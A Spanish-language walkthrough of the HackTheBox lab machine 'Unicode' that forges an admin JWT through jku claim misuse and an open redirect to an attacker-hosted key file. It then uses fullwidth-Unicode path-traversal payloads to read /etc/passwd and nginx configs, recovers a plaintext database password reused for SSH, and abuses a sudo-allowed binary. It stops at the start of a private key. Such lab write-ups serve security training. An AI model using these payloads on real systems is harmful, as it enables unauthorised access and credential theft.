# Máquina "Unicode" de HackTheBox

## Características

- **SO:** Linux  
- **Dificultad:** Media 
- **Tecnologías:** JWT, Enumeration JWT, Claim Misuse Vulnerability, JSON Web Key Generator (Playing with mkjwk), Forge JWT, Open Redirect Vulnerability, Creating a JWT for the admin user, LFI (Local File Inclusion), Unicode Normalization Vulnerability, Abusing Sudoers Privilege, Playing with pyinstxtractor and pycdc, Bypassing badchars and creating a new passwd archive (Privilege Escalation)

**Útil para:**
- eWPT 
- eWPTXv2 
- OSWE

**IP:** 10.10.11.126    

## Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.126 -oN allPorts
```

**Puertos abiertos:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Versiones de servicios:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Hugo 0.83.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hackmedia
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Codename:** Ubuntu 20.04 focal.

## Reconocimiento Web

Nos dirigimos a la página principal en el puerto 80 y vemos:

![Web principal](/secciones/posts/imagenes/unicode/web1.png)

Es solo un sitio estático con un botón grande en el medio que dice "Google about us", que devuelve un 302 a `http://google.com`. 

La URL es: `http://10.10.11.126/redirect/?url=google.com`

También vemos las secciones login y register funcionales, así que procedemos a crearnos una cuenta.

![Registro](/secciones/posts/imagenes/unicode/register1.png)

Una vez registrados podemos acceder al panel.

![Panel de usuario](/secciones/posts/imagenes/unicode/panel1.png)

Una vez dentro vemos "developed by Flask" (presumiblemente el framework de Python). "Buy now" lleva a `/pricing/` que tiene algunas otras páginas que no parecen tener mucha interacción. "Upload a Threat Report" presenta un formulario de carga simple.

Luego inspeccionamos las cookies y podemos ver lo que parece ser un JWT:

![Token JWT](/secciones/posts/imagenes/unicode/token1.webp)

## Análisis del JWT

Vamos a [jwt.io](https://jwt.io/?ref=secjuice.com) y efectivamente es un JWT:

![Análisis JWT](/secciones/posts/imagenes/unicode/jwt2.webp)

En la sección `jku` contiene una dirección que parece almacenar la clave pública para JWT. Agregamos la dirección al `/etc/hosts` pero el sitio se mantiene igual al visitarla.

Normalmente JWT es usado con el algoritmo HS256, un algoritmo simétrico que usa una firma hash256 con clave, por lo que esa clave es la misma para firmar y validar. Esto tiene sentido para autenticarse en el mismo sitio que lo emitió.

Pero hay veces que un sitio podría usar el token de otro sitio. Puede que en condiciones de tener un ecosistema de aplicaciones, y no quieran mantener los secretos sincronizados en todos lados, pero quieren tener un token otorgado en el ecosistema y confiar en él. Ahí es donde entra el algoritmo RS256. Utiliza una clave pública y una privada: firma el token con la privada y lo valida con la pública.

Esto significa que la clave pública puede estar disponible públicamente en el sitio web y cualquiera podría validar que el token es legítimo.

Debido a que este ecosistema de aplicaciones puede tener muchos posibles pares de claves confiables, cada token puede usar el `jku` y pretende mostrar dónde está la clave privada. Debido a que esto proviene del usuario, es responsabilidad del servidor de validación decidir si confiará en el servidor dado `jku`.

Podemos ver una forma de explotarlo en: https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c

## Explotación del JWT

El `jku` en el token de Unicode es `http://hackmedia.htb/static/jwks.json`. Es un objeto JSON simple, con una lista (en este caso solo uno en esa lista) de algunos metadatos sobre el algoritmo, y las secciones `n` y `e` del JWT, dos elementos que componen la clave pública en RSA.

Intentaré que Unicode valide un JWT usando una clave pública en mi servidor web. Si eso funciona, generaré un par de claves RSA e intentaré engañar a Unicode para que confíe en un token que falsificaré.

Podríamos usar Python con PyJWT para manipular JWT, pero en este caso, solo quiero cambiar el `jku`, y no me preocupa la firma (todavía), así que usaré base64 en bash (ya que un JWT es solo tres cadenas codificadas en base64 combinadas con `.`):

```bash
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ==" | base64 -d
```

Salida:
```json
{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/static/jwks.json"}
```

Agregué algo de relleno al final (los JWT lo eliminan) para que no se queje de una entrada no válida. Voy a cambiar el `jku`:

```bash
echo '{"typ":"JWT","alg":"RS256","jku":"http://10.10.14.6/jwks.json"}' | base64 -w0
```

Salida:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMC4xMC4xNC42L2p3a3MuanNvbiJ9Cg==
```

Reemplazaré la primera sección de mi JWT en Firefox y actualizaré `/dashboard`:

Nos devuelve un "jku validation failed". No puede ser que la firma no es válida ya que ni siquiera intentó consultar a mi servidor, a lo que suponemos que debe haber alguna especie de filtro dentro.

Si recordamos anteriormente había un redirect en el botón inicial `/redirect/?url=google.com`. Quizás el sitio confíe en que devuelva una clave pública. Actualizaré el `jku` a `http://hackmedia.htb/redirect/?url=10.10.14.6/jwks.json`:

```bash
echo -n '{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/redirect/?url=10.10.14.6/jwks.json"}' | base64 -w0
```

Salida:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTQuNi9qd2tzLmpzb24ifQ==
```

Esto todavía no funciona (no hay contacto en mi servidor web).

¿Qué pasa si el sitio está buscando algo que empiece con `hackmedia.htb/static`? Lo intentaré:

```bash
echo -n '{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/static/../redirect/?url=10.10.14.6/jwks.json"}' | base64 -w0
```

Salida:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8/dXJsPTEwLjEwLjE0LjYvandrcy5qc29uIn0=
```

Actualizando la cookie y recargando `/dashboard`, se muestra un acceso a mi servidor web:

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.126 - - [05/May/2022 19:39:45] code 404, message File not found
10.10.11.126 - - [05/May/2022 19:39:45] "GET /jwks.json HTTP/1.1" 404 -
```

Luego el navegador muestra el formulario de inicio de sesión (curiosamente, todavía está en `/dashboard`). Este es un gran indicador de que confiará en la clave pública que agregue aquí.

## Generación de claves RSA

Este [enlace de Akamai](https://techdocs.akamai.com/iot-token-access-control/docs/generate-rsa-keys) muestra los comandos para generar un par de claves RSA:

```bash
openssl genrsa -out jwtRSA256-private.pem
openssl rsa -in jwtRSA256-private.pem -pubout -outform PEM -out jwtRSA256-public.pem
```

La siguiente [página](https://techdocs.akamai.com/iot-token-access-control/docs/generate-jwt-rsa-keys) muestra cómo generar un JWT usando openssl, pero regresaré a jwt.io:

![Carga de claves](/secciones/posts/imagenes/unicode/loadkpkp.webp)

Las claves pública y privada se cargan en el bit de firma y los datos se ven bien. Lo cargaré en Firefox y verificaré que todavía llegue a mi servidor.

## Creación del archivo jwks.json

Para utilizar esta clave por completo, necesito crear un archivo `jwks.json` que coincida con esta nueva clave. Descargaré el archivo de clave pública existente en un directorio que estoy alojando:

```bash
wget http://hackmedia.htb/static/jwks.json
```

Lo único que necesito cambiar son los valores `n` y `e`.

OpenSSL dará estos:

```bash
openssl rsa -in jwtRSA256-public.pem -pubin -text -noout
```

Salida:
```
RSA Public-Key: (2048 bit)
Modulus:
    00:b7:45:d7:10:28:f0:17:62:ad:b0:1c:f3:00:32:
    95:46:df:a3:33:64:a2:a4:89:82:52:5d:13:e2:ff:
    e8:5a:d2:ec:92:32:ed:d1:12:80:c9:00:77:6b:f5:
    59:6a:81:99:89:6f:64:20:20:5c:f1:9d:e7:80:dd:
    a6:05:fd:27:17:4b:13:70:8c:6d:20:a8:95:c4:4c:
    0f:e2:46:48:a7:7b:04:af:f1:f6:74:39:9a:83:d0:
    74:54:44:e1:29:48:fb:2b:9b:90:9c:4a:7c:01:fd:
    75:34:5a:60:3d:a7:c5:38:3b:15:b7:d5:21:1d:ac:
    a1:18:0e:76:02:f9:ae:d5:11:46:fd:60:e4:89:4b:
    69:1d:d2:56:6f:54:c8:0d:a9:59:08:50:36:d6:f3:
    81:fb:c7:e7:a4:b2:ab:3c:88:76:74:42:f4:f0:04:
    d6:a1:3a:44:e1:96:eb:25:30:d4:fc:62:7c:9e:f3:
    dd:d9:c5:e1:01:3c:e4:20:c1:f7:cb:53:1d:40:de:
    4b:0a:f0:d9:93:ee:3e:fa:ef:ac:ea:6e:71:bd:ed:
    f8:99:06:c3:c0:cc:5f:2e:28:3f:5a:b4:6f:a1:d1:
    16:45:92:f8:21:49:09:92:b1:12:3d:8a:ee:a3:4c:
    ea:b8:6e:2f:3b:ff:13:64:68:45:9c:69:c9:11:31:
    68:77
Exponent: 65537 (0x10001)
```

El módulo es `n`, y el exponente es `e`. Todavía necesito ponerlos en el formato utilizado en `jwks.json`. Si miro `e`, es `AQAB`. Parece base64 y es:

```bash
echo "AQAB" | base64 -d | xxd -p
```

Salida: `010001`

Entonces, en lugar de mostrarlo como un número, está codificado en base64 en bytes sin procesar. El exponente tanto de la clave original como de mi clave privada es `0x10001` (que es muy común). Entonces solo necesito `n`.

Usaré `grep` para obtener solo las líneas con el módulo:

```bash
openssl rsa -in jwtRSA256-public.pem -pubin -text -noout | grep "^   "
```

Salida:
```
    00:b7:45:d7:10:28:f0:17:62:ad:b0:1c:f3:00:32:
    95:46:df:a3:33:64:a2:a4:89:82:52:5d:13:e2:ff:
    e8:5a:d2:ec:92:32:ed:d1:12:80:c9:00:77:6b:f5:
    59:6a:81:99:89:6f:64:20:20:5c:f1:9d:e7:80:dd:
    a6:05:fd:27:17:4b:13:70:8c:6d:20:a8:95:c4:4c:
    0f:e2:46:48:a7:7b:04:af:f1:f6:74:39:9a:83:d0:
    74:54:44:e1:29:48:fb:2b:9b:90:9c:4a:7c:01:fd:
    75:34:5a:60:3d:a7:c5:38:3b:15:b7:d5:21:1d:ac:
    a1:18:0e:76:02:f9:ae:d5:11:46:fd:60:e4:89:4b:
    69:1d:d2:56:6f:54:c8:0d:a9:59:08:50:36d6:f3:
    81:fb:c7:e7:a4:b2:ab:3c:88:76:74:42:f4:f0:04:
    d6:a1:3a:44:e1:96:eb:25:30:d4:fc:62:7c:9e:f3:
    dd:d9:c5:e1:01:3c:e4:20:c1:f7:cb:53:1d:40:de:
    4b:0a:f0:d9:93:ee:3e:fa:ef:ac:ea:6e:71:bd:ed:
    f8:99:06:c3:c0:cc:5f:2e:28:3f:5a:b4:6f:a1:d1:
    16:45:92:f8:21:49:09:92:b1:12:3d:8a:ee:a3:4c:
    ea:b8:6e:2f:3b:ff:13:64:68:45:9c:69:c9:11:31:
    68:77
```

Usaré `tr -d` para eliminar dos puntos, espacios y nuevas líneas para tener una salida en hexadecimal:

```bash
openssl rsa -in jwtRSA256-public.pem -pubin -text -noout | grep "^   " | tr -d ': \n'
```

Salida:
```
00b745d71028f01762adb01cf300329546dfa33364a2a48982525d13e2ffe85ad2ec9232edd11280c900776bf5596a8199896f6420205cf19de780dda605fd27174b13708c6d20a895c44c0fe24648a77b04aff1f674399a83d0745444e12948fb2b9b909c4a7c01fd75345a603da7c5383b15b7d5211daca1180e7602f9aed51146fd60e4894b691dd2566f54c80da959085036d6f381fbc7e7a4b2ab3c88767442f4f004d6a13a44e196eb2530d4fc627c9ef3ddd9c5e1013ce420c1f7cb531d40de4b0af0d993ee3efaefacea6e71bdedf89906c3c0cc5f2e283f5ab46fa1d1164592f821490992b1123d8aeea34ceab86e2f3bff136468459c69c911316877
```

Lo convertiré a bytes sin formato usando `xxd` y luego codificarlo en base64:

```bash
openssl rsa -in jwtRSA256-public.pem -pubin -text -noout | grep "^   " | tr -d ': \n' | xxd -r -p | base64 -w0
```

Salida:
```
ALdF1xAo8BdirbAc8wAylUbfozNkoqSJglJdE+L/6FrS7JIy7dESgMkAd2v1WWqBmYlvZCAgXPGd54DdpgX9JxdLE3CMbSColcRMD+JGSKd7BK/x9nQ5moPQdFRE4SlI+yubkJxKfAH9dTRaYD2nxTg7FbfVIR2soRgOdgL5rtURRv1g5IlLaR3SVm9UyA2pWQhQNtbzgfvH56SyqzyIdnRC9PAE1qE6ROGW6yUw1PxifJ7z3dnF4QE85CDB98tTHUDeSwrw2ZPuPvrvrOpucb3t+JkGw8DMXy4oP1q0b6HRFkWS+CFJCZKxEj2K7qNM6rhuLzv/E2RoRZxpyRExaHc=
```

Actualizaré ese valor en `jwks.json`.

Actualizamos Firefox, vemos el `/dashboard`, iniciamos sesión. Vemos que no he progresado con otro usuario, pudimos firmar un token que dice que soy usertest y que el sitio confíe en mí. Queríamos partir con un user existente para asegurarme de que si tuviera problemas, no sea porque falsifiqué un token para un usuario que no existe.

![Panel de administrador](/secciones/posts/imagenes/unicode/admindash.webp)

## Local File Inclusion (LFI)

Navegando encuentro un par de enlaces que te permiten descargar archivos, pero no parecen estar listos en este momento:
- `http://hackmedia.htb/display/?page=monthly.pdf`
- `http://hackmedia.htb/display/?page=quarterly.pdf`

¿Podría haber alguna vulnerabilidad en el path traversal? ¿O está relacionado con el enlace de carga que encontramos anteriormente?

Se muestra un interesante mensaje de error al intentar recuperar un archivo a través de la vulnerabilidad (`http://hackmedia.htb/display/?page=../../../../../../../../../../etc/passwd`).

Al final decidí repasar algunas teorías. Entre los diferentes tipos de este ataque, hay uno que utiliza Unicode.

```
http://hackmedia.htb/display/?page=..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1cet%c1%1cpasswd
```

Salida:
```
404
Hmmm...
..�..�..�..�..�..�..�..�..�..�..�..�..�..�etc�passwd Not found
```

Lo intento de nuevo y encuentro una especie de conversor que después de algunas pruebas parece ser el adecuado para mí. Usaremos: https://qaz.wtf/u/convert.cgi?ref=secjuice.com

Entonces trato de tomar el archivo `/etc/passwd` clásico de los usuarios.

![Conversor Unicode](/secciones/posts/imagenes/unicode/webto2.png)

La URL en la barra de direcciones del navegador parece ser así: `http://hackmedia.htb/display/?page=．．／．．／．．／．．／ｅｔｃ／ｐａｓｓｗｄ`

```
http://hackmedia.htb/display/?page=%EF%BC%8E%EF%BC%8E%EF%BC%8F%EF%BC%8E%EF%BC%8E%EF%BC%8F%EF%BC%8E%EF%BC%8E%EF%BC%8F%EF%BC%8E%EF%BC%8E%EF%BC%8F%EF%BD%85%EF%BD%94%EF%BD%83%EF%BC%8F%EF%BD%90%EF%BD%81%EF%BD%93%EF%BD%93%EF%BD%97%EF%BD%84
```

Y otra vez... obtenemos:

```
root:x:0:0:root:/root:/bin/bash 
[...]
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
code:x:1000:1000:,,,:/home/code:/bin/bash
```

Buscamos la bandera:

```
../../../../home/code/user.txt

http://hackmedia.htb/display/?page=%EF%BC%8E%EF%BC%8E%EF%BC%8F%EF%BC%8E%EF%BC%8E%EF%BC%8F%EF%BC%8E%EF%BC%8E%EF%BC%8F%EF%BC%8E%EF%BC%8E%EF%BC%8F%EF%BD%88%EF%BD%8F%EF%BD%8D%EF%BD%85%EF%BC%8F%EF%BD%83%EF%BD%8F%EF%BD%84%EF%BD%85%EF%BC%8F%EF%BD%95%EF%BD%93%EF%BD%85%EF%BD%92%EF%BC%8E%EF%BD%94%EF%BD%98%EF%BD%94
```

Resultado: `9******************************2`

## Búsqueda de credenciales

Continuando y recordamos que a través de Wappalyzer también se está ejecutando un servicio nginx versión 1.18.0 en esta máquina. Puede que nginx también tenga archivos de configuración, veamos dónde están y si es posible recuperar alguno de ellos.

Referencia: https://www.plesk.com/blog/various/nginx-configuration-guide/

Intentamos con `/etc/nginx/nginx.conf`:

```
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {
        ##
        # Basic Settings
        ##
        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # SSL Settings
        ##
        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        ##
        # Logging Settings
        ##
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##
        gzip on;

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}
[...]
```

Los archivos de configuración de los portales deberían estar en la carpeta `/etc/nginx/sites-available/`, en un archivo con el nombre del dominio (hackmedia o unicode). Intento con el archivo de configuración predeterminado `/etc/nginx/sites-available/default`:

```
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s;

server{
    #Change the Webroot from /home/code/app/ to /var/www/html/
    #change the user password from db.yaml

    listen 80;
    error_page 503 /rate-limited/;

    location / {
        limit_req zone=mylimit;
        proxy_pass http://localhost:8000;
        include /etc/nginx/proxy_params;
        proxy_redirect off;
    }
    
    location /static/{
        alias /home/code/coder/static/styles/;
    }
}
```

Lo que nos importa son los comentarios que contiene y finalmente encuentro lo que busco:

`/home/code/coder/db.yaml`

```yaml
mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
```

Probamos las credenciales con SSH y estamos dentro.

## Escalación de privilegios

Y ahora incrementemos los privilegios. Inmediatamente queda claro en qué debemos centrarnos:

```bash
sudo -l
```

Salida:
```
Matching Defaults entries for code on code:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
```

Lanzamos el binario para ver de qué trata y vemos que es un compilado Python:

```bash
sudo /usr/bin/treport
```

Salida:
```
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:1
Enter the filename:/tmp/in7rud3r.txt
Enter the report:
Traceback (most recent call last):
File "treport.py", line 74, in <module>
File "treport.py", line 13, in create
FileNotFoundError: [Errno 2] No such file or directory: '/root/reports//tmp/in7rud3r.txt'
[19936] Failed to execute script 'treport' due to unhandled exception!
```

Intentamos de nuevo:

```bash
sudo /usr/bin/treport
```

Y esta vez vemos:

```
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:2
ALL THE THREAT REPORTS:
threat_report_15_54_06 threat_report_15_57_33 threat_report_15_02_28 threat_report_17_12_41 aaa threat_report_15_45_09 threat_report_15_04_07 threat_report_15_55_55 a threat_report_15_42_54 threat_report_16_11_50
Enter the filename:threat_report_15_54_06
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEA